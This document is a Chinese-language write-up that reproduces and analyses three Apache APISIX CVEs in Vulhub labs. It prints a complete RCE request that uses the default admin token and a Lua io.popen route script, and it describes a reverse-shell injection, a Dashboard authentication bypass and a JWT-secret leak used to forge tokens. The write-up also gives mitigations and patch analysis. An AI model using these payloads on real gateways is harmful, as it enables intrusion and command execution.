[Apache APISIX](https://github.com/apache/apisix/tree/master)是一个动态、实时、高性能的API网关。<font style="color:rgba(0, 0, 0, 0.85);">与传统的API网关相比，APISIX是通过插件的形式来提供负载均衡、日志记录、身份鉴权、流量控制等功能。本文主要对其部分CVE历史漏洞进行复现和分析。 </font>

<font style="color:rgba(0, 0, 0, 0.85);">渗透测试的基本信息：</font>

| 系统 | 默认端口 | 默认凭据 |
| :---: | :---: | :---: |
| <font style="color:rgb(79, 79, 79);">Apache APISIX</font> | 9080 | <font style="color:rgb(79, 79, 79);">edd1c9f034335f136f87ad84b625c8f1</font> |
| <font style="color:rgb(79, 79, 79);">Apache APISIX Dashboard</font> | 9000 | admin/admin |


# <font style="color:rgb(54, 54, 54);background-color:rgb(252, 252, 252);">CVE-2020-13945</font>
根据CVE的描述，漏洞发生在当使用者开启了Admin API，没有配置相应的IP访问策略，且没有修改配置文件Token的情况下，则攻击者利用Apache APISIX的默认Token即可访问Apache APISIX，从而控制APISIX网关。

> Apache APISIX的默认Token是`edd1c9f034335f136f87ad84b625c8f1`。
>
> ![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758850910754-203fe012-a7d9-4bbf-bb42-d71c7a918751.png)
>

漏洞提出时受影响的版本是1.2、1.3、1.4、1.5。

这个配置文件所在目录是`conf/config.yaml`，查看历史代码可以发现官方在`release/3.10`才把这个问题修复，之前都只是给出安全提醒：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758850951270-7c8ac4ad-2ffe-4e03-89f9-d907b8660658.png)

修复后如果配置文件Token置空，则会自动生成。

现在基于Vulhub快速搭建该漏洞环境：

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/apisix/CVE-2020-13945
docker-compose up -d
```

访问`http://127.0.0.1:9080/`，可以看到默认的404页面：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758853174992-28349543-e748-41db-b423-050c6ae7faeb.png)

阅读APISIX的[Admin API](https://apisix.apache.org/zh/docs/apisix/3.10/admin-api/#description)文档，了解如何配置路由，然后开始构造PoC。

首先将访问`http://127.0.0.1:9080/`的请求包的请求方法修改为POST，URL改成`/apisix/admin/routes`（路由资源请求地址），然后加上X-API-KEY参数（即`./conf/config.yaml`文件中的`deployment.admin.admin_key.key`），路由配置如下：

```bash
{
    "uri": "/attack",
    "script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
    "upstream": {
        "type": "roundrobin",
        "nodes": {
            "example.com:80": 1
        }
    }
}
```

解释下这段配置：

+ `"uri": "/attack"`这行配置指定了APISIX路由的URI路径。当用户访问`http://127.0.0.1:9080/apisix/admin/route/attack`时，APISIX会匹配这个路径并将请求交给相应的处理程序
+ `"script"`这段配置定义了一个Lua脚本（文档中有说到，理论上在Script中可以编写任意Lua代码），用于在访问这个URI时执行的逻辑，关键的一些操作如下：
    - `local os = require('os')`：加载Lua的`os`库，这是一个系统操作相关的库，可以执行系统命令
    - `local args = assert(ngx.req.get_uri_args())`：从请求中获取`cmd`参数
    - `local f = assert(io.popen(args.cmd, 'r'))`：通过`args.cmd`参数的值启动一个外部进程
    - `ngx.say(s)`：将命令的输出通过`ngx.say`输出到客户端响应，`ngx.say`是Nginx/OpenResty提供的一个函数，用于发送响应
+ `"upstream"`这段配置是后端的负载均衡设置，使用轮询（round-robin）的负载均衡策略，指定了一个后端节点`example.com:80`，并且它的权重是 1，意味着请求会被轮流转发到`example.com:80`

完整请求如下：

```bash
POST /apisix/admin/routes HTTP/1.1
Host: your-ip:9080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 412
X-API-KEY: edd1c9f034335f136f87ad84b625c8f1

{
    "uri": "/attack",
    "script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
    "upstream": {
        "type": "roundrobin",
        "nodes": {
            "example.com:80": 1
        }
    }
}
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758856640259-ec5dfb61-29d4-43ae-bb95-3c70142f8164.png)

创建成功。接着可以访问刚刚创建好的路由（访问的是`your-ip:9080/attack`），并且通过`cmd`参数执行恶意的命令：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758856914502-589f4fea-7633-4281-bb89-4b84a95987cf.png)

复现成功。

针对这个漏洞，安全建议如下：

1. 修改`conf/config.yaml`的`deployment.admin.admin_key.key`，禁止使用默认Token
2. 若非必要，关闭Admin API功能，或者增加IP访问限制（通过`ip-restriction`插件来实现，在`"plugins"`参数中设置）
3. 升级Apache APISIX至最新版本（至少3.11及以上）

# <font style="color:rgb(79, 79, 79);">CVE-2021-45232</font>
根据CVE的描述，在2.10.1之前的Apache APISIX Dashboard中，Manager API使用了两个框架，并在框架gin的基础上引入了框架droplet，所有的API和认证中间件都是基于框架droplet开发的，但有些API直接使用框架gin的接口，从而绕过了认证。

漏洞提出时受影响的版本是2.7、2.7.1、2.8、2.9、2.10。

基于Vulhub快速搭建该漏洞环境：

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/apisix/CVE-2021-45232
docker-compose up -d
```

访问`http://127.0.0.1:9000/`，可以看到<font style="color:rgb(77, 77, 77);">Apache APISIX Dashboard的登录页面</font>：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758871666844-403dd51e-75a6-4055-9587-3cc1f51fdf17.png)

<font style="color:rgb(77, 77, 77);">官方默认登录账户密码是admin/admin，但是Vulhub镜像的密码是vulhub。</font>

<font style="color:rgb(77, 77, 77);">进入后台后首先创建一个上游：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758872551662-400800bc-1d72-41d0-82c5-7f55df273ee1.png)

<font style="color:rgb(77, 77, 77);">然后创建一个路由，选择上游服务为刚刚创建的上游：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758872688350-608a1527-4325-4113-8681-ba811631d811.png)

查看创建好的路由：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759043000382-f312219e-7e3f-4fa2-8942-e775165ca858.png)

开始插入反弹Shell的Lua脚本：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759043020174-a7cd4b81-2f8e-4136-8608-4ef1a7e57a79.png)

提交后访问`http://127.0.0.1:9080/test_route`，此时在攻击机可以看到已经反弹了Shell：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759043060693-39332e55-a2a5-4c05-9e48-ef0d61f3cda9.png)

成功RCE。

不过到现在为止攻击都是建立在有默认账号密码登录的基础上。那么在实战中，如果没有账号密码或者弱密码，就要利用最开始提到的绕过认证的API，一共有两个，分别是`/apisix/admin/migrate/export`（导出配置文件）和`/apisix/admin/migrate/import`（导入配置文件）。

退出登录，调用导出配置文件的API，抓包：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759045255933-75aa2bcf-dfa7-4912-b9d7-9d5784b6723a.png)

可以看到配置文件毫无保留地被导出。最后多出来的4个字节是配置文件的checksum值，checksum（校验和）是DEX位于文件头部的一个信息，用来判断DEX文件是否损坏或者被篡改，它位于头部的`0x08`偏移地址处，占用4个字节，采用小端序存储。在导入配置文件时，也会对配置文件的checksum值进行校验，编写脚本时应参考源码`api/internal/handler/migrate/migrate.go`的写法：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759046042975-51d48b66-1f36-4083-9c80-14d254e0ba42.png)

为了方便就不自己写了，直接使用Vulhub自带的脚本`apisix_dashboard_rce.py`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759046443375-f1c65025-2380-4bf5-b860-d7dc1ed7005d.png)

回到Dashboard的路由，可以看到一个恶意路由被创建：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759046490133-4fa8ae1f-2078-426e-89e0-c7bebe58a8c5.png)

关于这个漏洞，可以回到源码中进行分析。

以Vulhub中用的2.9版本源码为例，`api/internal/filter/authentication.go`依赖于droplet框架进行身份认证，定义了当用户访问以`/apisix`为前缀的API时，通过Authorization字段进行认证，同时定义了`/apisix/admin/tool/version`和`/apisix/admin/user/login`是不需要认证的：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759047307641-d560f8ac-7243-4b75-91fb-cf10a510211b.png)

而在`api/internal/handler/migrate/migrate.go`中可以看到，导出配置文件和导入配置文件这两个API都是挂载到gin路由上的，从而绕过了认证：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759047401594-5f3b1bd9-d8a4-41d4-9944-08b7fcec8d16.png)

针对此漏洞，官方的补丁是[Commit b565f7c](https://github.com/apache/apisix-dashboard/commit/b565f7cd090e9ee2043fbb726fbaae01737f83cd#diff-a16bc2c469646367bf6d9f635ee85a8e13109732bdb0caba8cec71f015bc0c1c)，删除了对于droplet的验证，新增了关于gin的jwt认证：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759047737449-fa368b42-5835-482a-a73c-bacf6ad61c1a.png)

# <font style="color:rgb(79, 79, 79);">CVE-2022-29266</font>
根据CVE的描述，在2.13.1之前的Apache APISIX中，jwt-auth插件存在安全问题，导致用户密钥泄露，因为依赖项lua-resty-jwt返回的错误消息可能会包含JWT的sceret值。

由于基于Vulhub搭建的CVE-2021-45232漏洞环境使用的Apache APISIX版本是2.9，符合漏洞影响版本，所以继续在CVE-2021-45232漏洞的环境中进行复现。

首先进入Dashboard，创建一个消费者：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759048255716-bb1df85d-8fe5-4439-852e-0b4c854fd12b.png)

启用jwt-auth插件：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759048289269-543c95a7-7dfd-41cb-892e-1c452ddb8272.png)

点击启用，填入key和secret，算法默认使用的是HS256：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759048402811-862a292b-af16-47b0-8ddb-884bd9dfe1d5.png)

接着新建路由：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759048677676-8ed8433b-032f-4625-969b-9e6f76a8ad00.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759048705600-1756eea2-36c5-4c75-9fe5-ae96cf52daf8.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759048731010-b890b5fb-1091-4af8-95c1-d1eb51f831de.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759048747317-fc4468ee-f7d8-4cf8-acce-d3c4366c5c9e.png)

当我们启用了jwt-auth插件后，会增加`/apisix/plugin/jwt/sign`这个接口。

在命令行输入以下命令，参数key的值就是我们刚刚在消费者配置的key值：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759049082503-a502b088-c133-48ad-8a10-22d19a11bbdc.png)

用这串JWT进行HS256解码：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759050419097-6de4ee4b-c34e-4be8-8f4d-65d14f94aec2.png)

修改payload和算法（RS256）后进行编码：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759050458035-9b22f80e-5d86-42e0-bd8a-8efa0c7cbdc7.png)

带着这串JWT访问刚刚创建的路由：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759050566903-b49c9e9e-b25a-4c4b-8db5-dc299719a3fb.png)

拿到JWT的secret，可以自行颁发JWT了：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759050645920-4c65d5af-4419-41b8-8652-3d60a5a28c84.png)

拿着这串JWT访问刚刚的路由：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759050721958-e9766047-6804-4656-899d-3fea38de3e33.png)

没有返回401，说明鉴权成功，达到了伪造JWT的目的。

现在从源码的角度分析下，为什么上面要这么复现。

首先官方对这个漏洞的分析代码是[fix: jwt-auth error may leak secret #6846](https://github.com/apache/apisix/pull/6846/commits/bf296bbdad52055d9362958e9262c861a4b723ed)：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759050925830-6aad5d1e-d824-418d-aded-27213e992471.png)

可以看到原来401会返回`jwt_obj.reason`，现在改成了本地日志打印。

定位到`lua-resty-jwt`的`lib/resty/jwt.lua`：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759051238957-770b09ec-ca99-4dbb-a48f-a13168885645.png)

`err and err or secret`的意思是：如果`err`为`nil`，则返回`secret`的值，否则返回`err`。所以漏洞利用的目标就是让这一行代码执行：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1759051778542-be15ea43-1783-47dc-a104-e1cbcf82ad26.png)

图中红框便是这一行代码执行的关键节点条件，即：

+ JWT的算法是RS256或者RS512
+ `trusted_certs_file`等于`nil`
+ `secret`不等于`nil`
+ `secret`不包含`CERTIFICATE`或`PUBLIC KEY`
+ `cert`等于`nil`或者`false`

所以在宏观上要满足以下几个前提：

+ Apache APISIX需要启用jwt-auth插件
+ jwt-auth插件算法需要是HS256或者HS512
+ secret的值中不能包含CERTIFICATE和PUBLIC KEY字符串

那么当我们用RS256或者RS512的JWT发送给Apache APISIX的时候，我们就会得到jwt-auth中的secret，从而实现JWT伪造。

